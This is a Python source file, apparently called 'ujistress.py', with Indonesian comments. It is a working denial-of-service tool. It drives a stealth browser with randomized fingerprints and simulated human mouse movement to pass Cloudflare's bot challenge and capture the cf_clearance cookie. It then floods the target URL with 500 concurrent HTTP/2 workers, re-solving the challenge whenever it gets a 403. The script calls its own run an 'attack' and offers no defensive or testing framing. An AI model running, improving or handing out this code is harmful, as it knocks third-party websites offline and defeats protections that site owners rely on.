import asyncio
import sys
import time
import random
import os
from dataclasses import dataclass
from typing import Any, Dict, List, Optional, Tuple

import httpx
from camoufox.async_api import AsyncCamoufox
from browserforge.fingerprints import Screen
from colorama import init, Fore, Style

init(autoreset=True)

# Data Class CloudflareCookie (Dibiarkan sama)
@dataclass
class CloudflareCookie:
    name: str
    value: str
    domain: str
    path: str
    expires: int
    http_only: bool
    secure: bool
    same_site: str

    @classmethod
    def from_json(cls, cookie_data: Dict[str, Any]) -> "CloudflareCookie":
        return cls(
            name=cookie_data.get("name", ""),
            value=cookie_data.get("value", ""),
            domain=cookie_data.get("domain", ""),
            path=cookie_data.get("path", "/"),
            expires=cookie_data.get("expires", 0),
            http_only=cookie_data.get("httpOnly", False),
            secure=cookie_data.get("secure", False),
            same_site=cookie_data.get("sameSite", "Lax"),
        )

class SimpleCloudflareSolver:
    def __init__(self, sleep_time=5, headless=True, os=None, debug=False, retries=10):
        self.cf_clearance = None
        self.sleep_time = sleep_time
        self.headless = headless
        self.os = os or ["windows", "macos"]
        self.debug = debug
        self.retries = retries

    async def solve(self, link: str, proxy: Optional[str] = None) -> Tuple[Optional[str], Optional[str]]:
        
        try:
            print(f"{Fore.GREEN}[info]{Style.RESET_ALL} Starting simple browser...")
            
            # Variasi Fingerprint
            resolutions = [
                Screen(max_width=1920, max_height=1080), 
                Screen(max_width=1366, max_height=768),
                Screen(max_width=1536, max_height=864)
            ]
            selected_screen = random.choice(resolutions)
            selected_os = random.choice(self.os)
            
            browser_args = [
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-infobars",
                "--lang=en-US,en;q=0.9",
                f"--window-size={selected_screen.max_width},{selected_screen.max_height}",
            ]
            
            async with AsyncCamoufox(
                headless=self.headless,
                os=selected_os,
                screen=selected_screen, 
                args=browser_args,
            ) as browser:
                
                # Perilaku Sebelum Navigasi (Penundaan Acak)
                initial_delay = random.uniform(1.5, 4.0)
                print(f"{Fore.CYAN}[delay]{Style.RESET_ALL} Initial delay for {initial_delay:.2f}s...")
                await asyncio.sleep(initial_delay) 
                
                # --- PERBAIKAN: Membuat context secara eksplisit, lalu page dari context ---
                # Ini mengatasi AttributeError: 'AsyncCamoufox' object has no attribute 'new_page'
                context = await browser.new_context() 
                page = await context.new_page()
                # --------------------------------------------------------------------------

                await page.set_viewport_size({"width": selected_screen.max_width, "height": selected_screen.max_height})

                print(f"{Fore.CYAN}[info]{Style.RESET_ALL} Navigating to: {link}")
                await page.goto(link)

                print(f"{Fore.YELLOW}[info]{Style.RESET_ALL} Waiting for Cloudflare to process (Max 45s)...")
                max_wait_time = 45 
                
                cf_challenge_words = ["just a moment", "checking your browser"]
                challenge_completed = False

                # Looping Tunggu dengan Jitter dan Scroll
                for elapsed_time in range(0, max_wait_time, 2):
                    sleep_duration = random.uniform(2.0, 3.5)
                    await asyncio.sleep(sleep_duration) 
                    
                    title = await page.title()
                    frames = len(page.frames)
                    print(f"{Fore.CYAN}[wait {elapsed_time + sleep_duration:.2f}s]{Style.RESET_ALL} Title: '{title}' | Frames: {frames}")

                    if elapsed_time % 6 == 0:
                        scroll_amount = random.randint(50, 300)
                        await page.mouse.wheel(0, scroll_amount) 
                        print(f"{Fore.CYAN}[action]{Style.RESET_ALL} Scrolled down by {scroll_amount} pixels.")
                    
                    if not any(word in title.lower() for word in cf_challenge_words):
                        print(f"{Fore.GREEN}[success]{Style.RESET_ALL} Challenge seems completed!")
                        challenge_completed = True
                        break

                    # Logic Klik Human-Like
                    challenge_frame_found = False
                    for frame in page.frames:
                        if "challenges.cloudflare.com" in frame.url:
                            if not challenge_frame_found:
                                print(f"{Fore.YELLOW}[action]{Style.RESET_ALL} Attempting human-like click...")
                                try:
                                    frame_element = await frame.frame_element()
                                    box = await frame_element.bounding_box()
                                    
                                    if box:
                                        click_x = box["x"] + box["width"] / 2 + random.uniform(-15, 15) 
                                        click_y = box["y"] + box["height"] / 2 + random.uniform(-15, 15)
                                        
                                        await page.mouse.move(click_x, click_y, steps=random.randint(10, 30))
                                        await asyncio.sleep(random.uniform(0.1, 0.4))
                                        
                                        await page.mouse.click(click_x, click_y)
                                        challenge_frame_found = True
                                        await asyncio.sleep(random.uniform(3, 5))
                                except Exception:
                                    pass

                # Pengecekan Cookie Setelah Penyelesaian
                print(f"{Fore.CYAN}[info]{Style.RESET_ALL} Checking for cookies...")
                
                if challenge_completed:
                    await asyncio.sleep(random.uniform(3.0, 5.0)) 
                
                # Menggunakan context untuk mengambil cookies (lebih bersih)
                cookies = await context.cookies()
                ua = await page.evaluate("() => navigator.userAgent")
                
                cf_cookie = next((c for c in cookies if c["name"] == "cf_clearance"), None)

                if cf_cookie:
                    print(f"{Fore.GREEN}[success]{Style.RESET_ALL} cf_clearance found!")
                    return cf_cookie["value"], ua
                else:
                    print(f"{Fore.RED}[error]{Style.RESET_ALL} No cf_clearance cookie found")
                    return None, None

        except Exception as e:
            print(f"{Fore.RED}[error]{Style.RESET_ALL} Error during solve: {e}")
            return None, None
            
        # Browser ditutup otomatis oleh 'async with'

# --- FUNGSI LAINNYA (Tidak berubah) ---
def load_proxies() -> List[str]:
    print(f"{Fore.RED}[info]{Style.RESET_ALL} Proxy loading skipped. Using direct connection.")
    return []

# --- VARIABEL KONSTANTA ---
WORKERS_COUNT = 500 
MAX_CONNECTIONS_PER_WORKER = 10 
MAX_RE_SOLVE_ATTEMPTS = 5 

# --- FUNGSI H2_FLOOD (Tidak berubah) ---
async def h2_flood(target: str, ua: str, cookie: str, duration: float) -> bool:
    
    timeout = httpx.Timeout(5.0) 
    limits = httpx.Limits(max_keepalive_connections=MAX_CONNECTIONS_PER_WORKER, max_connections=MAX_CONNECTIONS_PER_WORKER)
    
    headers = {
        "User-Agent": ua,
        "Cookie": cookie,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1"
    }
    
    client = httpx.AsyncClient(headers=headers, timeout=timeout, limits=limits, http2=True)

    print(f"{Fore.RED}[proxy]{Style.RESET_ALL} Running flood without proxy (Direct Connection from VPS IP).")

    end_time = time.time() + duration

    stop_event = asyncio.Event() 
    re_solve_required = False

    async def worker():
        nonlocal re_solve_required
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                sleep_duration = random.uniform(0.05, 0.75) 
                await asyncio.sleep(sleep_duration) 
                
                r = await client.get(target)
                
                if r.status_code == 403:
                    if not stop_event.is_set():
                        print(f"{Fore.RED}--- [403 DETECTED] ---{Style.RESET_ALL} Cookie expired. Triggering re-solve...")
                        re_solve_required = True
                        stop_event.set()
                    return
                    
                print(f"[H2] Status: {r.status_code}")
                
            except httpx.ConnectError:
                print(f"[H2][error] Connection Error (Target/Rate Limited)")
            except httpx.ReadTimeout:
                print(f"[H2][error] Timeout")
            except Exception as e:
                print(f"[H2][error] {type(e).__name__}: {e}")
                
    tasks = [asyncio.create_task(worker()) for _ in range(WORKERS_COUNT)]
    
    try:
        remaining_duration = end_time - time.time()
        
        if remaining_duration > 0:
            print(f"{Fore.MAGENTA}[timeout]{Style.RESET_ALL} Waiting for {remaining_duration:.2f} seconds until timeout...")
            
            done, pending = await asyncio.wait(
                tasks,
                timeout=remaining_duration,
                return_when=asyncio.ALL_COMPLETED 
            )

            for task in pending:
                task.cancel()
                
            await asyncio.sleep(1)
            
    except asyncio.CancelledError:
        print(f"{Fore.YELLOW}[stop]{Style.RESET_ALL} Flood task cancelled.")
    except Exception as e:
        print(f"{Fore.RED}[error]{Style.RESET_ALL} Error during flood run: {e}")
        
    finally:
        await client.aclose()
        print(f"{Fore.GREEN}[info]{Style.RESET_ALL} HTTP client closed.")
        
    return re_solve_required

# --- FUNGSI MAIN (Tidak berubah) ---
async def main(url: str, duration: int):
    
    load_proxies() 
    solver = SimpleCloudflareSolver(os=["windows", "macos"]) 
    
    cf_value = None
    ua = None
    
    re_solve_count = 0
    start_time = time.time()
    
    while time.time() - start_time < duration and re_solve_count < MAX_RE_SOLVE_ATTEMPTS:
        
        # 1. SOLVE 
        print(f"\n{Fore.CYAN}--- Memulai Pemecahan Cloudflare (Attempt {re_solve_count + 1}) ---{Style.RESET_ALL}")
        cf_value, ua = await solver.solve(url, None)
            
        if not cf_value or not ua:
            print(f"{Fore.RED}[error]{Style.RESET_ALL} Failed to solve Cloudflare. Exiting.")
            return

        cookie_header = f"cf_clearance={cf_value}"
        print(f"\n{Fore.GREEN}--- Memulai HTTP/2 Flood ---{Style.RESET_ALL}")
        print(f"[*] cf_clearance: {cf_value[:20]}...")
        print(f"[*] User-Agent: {ua[:50]}...")
        print(f"[+] Time Remaining: {duration - (time.time() - start_time):.2f}s")
        print(f"[+] Workers: {WORKERS_COUNT}")
        
        # 2. FLOOD
        time_remaining = duration - (time.time() - start_time)
        
        if time_remaining <= 5: 
            print(f"{Fore.YELLOW}[info]{Style.RESET_ALL} Duration exhausted or too short to continue. Stopping flood.")
            break
            
        re_solve_needed = await h2_flood(url, ua, cookie_header, time_remaining)
        
        # 3. CHECK STATUS
        if re_solve_needed:
            re_solve_count += 1
            if re_solve_count >= MAX_RE_SOLVE_ATTEMPTS:
                print(f"{Fore.RED}[FINAL-ERROR]{Style.RESET_ALL} Maximum re-solve attempts reached. Stopping attack.")
                break
                
            print(f"{Fore.YELLOW}[RE-SOLVE]{Style.RESET_ALL} Cloudflare re-solve triggered. Waiting 5s before retrying...")
            await asyncio.sleep(5) 
        else:
            break 
            
    print(f"{Fore.GREEN}--- ATTACK FINISHED ---{Style.RESET_ALL}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"{Fore.RED}Usage:{Style.RESET_ALL} python3 ujistress.py <url> <duration_in_seconds> SCRIPT BY @AKHIBARA V1")
        sys.exit(1)

    target_url = sys.argv[1]
    try:
        dur = int(sys.argv[2])
    except ValueError:
        print(f"{Fore.RED}Error:{Style.RESET_ALL} Durasi harus berupa angka (dalam detik)")
        sys.exit(1)

    asyncio.run(main(target_url, dur))
